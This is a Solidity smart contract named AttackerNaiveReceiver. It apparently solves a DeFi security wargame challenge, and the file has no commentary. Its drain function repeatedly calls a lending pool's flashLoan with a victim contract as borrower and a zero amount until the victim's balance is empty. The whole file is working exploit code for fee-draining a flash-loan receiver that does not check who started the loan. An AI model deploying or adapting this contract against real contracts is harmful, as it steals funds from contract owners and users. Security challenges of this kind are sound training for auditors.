pragma solidity ^0.6.0;

contract AttackerNaiveReceiver {
    address payable private _pool;

    constructor(address payable poolAddress) public {
        _pool = poolAddress;
    }

    function drain(address payable victim) public {
      while (victim.balance > 0) {
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, ) = _pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", victim, 0));
        require(success, "Call failed");
      }
    }
}
